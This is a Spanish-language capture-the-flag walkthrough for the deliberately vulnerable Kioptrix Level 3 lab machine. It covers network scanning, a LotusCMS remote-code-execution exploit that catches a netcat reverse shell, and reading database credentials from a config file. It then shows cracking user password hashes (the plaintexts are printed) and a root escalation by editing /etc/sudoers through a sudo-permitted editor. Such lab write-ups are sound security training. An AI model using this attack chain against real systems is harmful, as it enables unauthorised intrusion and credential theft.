# Kioptrix Level 3 Walkthrough

# Kioptrix Level 3

## Resolución de la Maquina

### Escaneo y Análisis de Vulnerabilidades

Empezamos con un escaneo a nuestra red local con el comando arp para obtener la ip de nuestra maquina objetivo.

```bash
arp-scan -I eth0 --localnet
```

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled.png)

Una vez obtenida la ip procedemos a realizar un escaneo con nmap.

```bash
nmap -sCV 192.168.66.161
```

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-25 13:37 EDT
Nmap scan report for kioptrix3.com (192.168.66.161)
Host is up (0.0099s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Ligoat Security - Got Goat? Security ...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.34 seconds
```

Tras realizar el escaneo con nmap vemos que tiene el puerto 80 abierto con un servicio http por lo que vamos a ver que contiene utilizando nuestro buscador en este caso Firefox y vemos la siguiente web.

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%201.png)

En la descripcion de la maquina nos dice que añadamos el dominio [kioptrix3.com](http://kioptrix3.com) a nuestro fichero /etc/hosts para poder ver bien la web por lo que lo abrimos y añadimos lo siguiente:

```bash
192.168.66.161  kioptrix3.com
```

### Explotación

Tras husmear por la pagina vemos que la web esta hecha con LotusCMS

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%202.png)

Por lo que pasamos a buscar en Google si existe algún exploit para este CMS y encontramos el siguiente:

https://github.com/Hood3dRob1n/LotusCMS-Exploit

lo clonamos a nuestra maquina y ejecutamos

```bash
./lotusRCE.sh kioptrix3.com /

#Introducimos nuestra ip
192.168.66.152 
#El puerto
4444
#En otra terminal iniciamos netcat
nc -nlvp 4444
#selecionamos la opcion 1
1
#obtenemos una shell
nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.66.152] from (UNKNOWN) [192.168.66.161] 38651
whoami
www-data
```

Realizamos un tratamiento de la tty para trabajar mas cómodos y poder hacer Ctrl+C

```bash
script /dev/null -c bash
stty raw –echo; fg
reset xterm
export SHELL=bash
export TERM=xterm
stty rows <num> columns <cols>
```

Tras enumerar un rato encontramos el archivo gconfig.php en /home/www/kioptrix3.com/gallery el cual contiene unas credenciales a la base de datos.

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%203.png)

Nos logeamos en mysql:

```bash
mysql -uroot -pfuckeyou
```

Y obtenemos las credenciales del usuario admin pero tras realizar unos intentos no nos sirve para cambiar de usuario.

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%204.png)

Pasamos a logearnos en phpmyadmin con las credenciales obtenidas anteriormente.

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%205.png)

y localizamos los hashes de los usuarios de la maquina

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%206.png)

he utilizado una web online para crackear estos hashes obteniendo la contraseña en texto claro

[https://crackstation.net/](https://crackstation.net/)

Dreg

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%207.png)

loneferret

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%208.png)

```bash
dreg:Mast3r
loneferret:starwars
```

una vez obtenida las credenciales pasamos a conectarnos a través de SSH pero obtenemos un error.

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%209.png)

Para solucionarlo escribimos lo siguiente para conectarnos:

```bash
ssh  -oHostKeyAlgorithms=+ssh-dss loneferret@192.168.66.161
```

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2010.png)

### Escalada de Privilegios

Si leemos el fichero CompanyPolicy.README nos dice que han instalado un nuevo software para editar, crear y ver archivos y que para ello utilicemos el comando “sudo ht”.

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2011.png)

Con sudo -l vemos que tenemos permisos para ejecutarlo con sudo.

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2012.png)

si lo ejecutamos de primeras nos saltara un error por lo que tenemos que ejecutar lo siguiente:

```bash
export TERM=xterm
```

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2013.png)

y ejecutamos:

```bash
sudo ht
```

Para abrir un fichero debemos de utilizar las teclas ALT+ F y seleccionar el campo open:

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2014.png)

Vamos a editar el fichero /etc/sudoers para poder lanzar una Shell como root y así escalar privilegios.

Para ello escribimos /etc/sudoers y damos al enter.

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2015.png)

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2016.png)

Añadimos el siguiente comando seguido de los comandos existentes al usuario loneferret para que pueda ejecutarlo con sudo.

```bash
, bin/sh
```

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2017.png)

Pulsamos ALT + F  guardamos y salimos.

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2018.png)

Obtenemos una Shell como root:

```bash
loneferret@Kioptrix3:~$ sudo sh
# whoami
root
```
Un saludo y Feliz Hacking :)

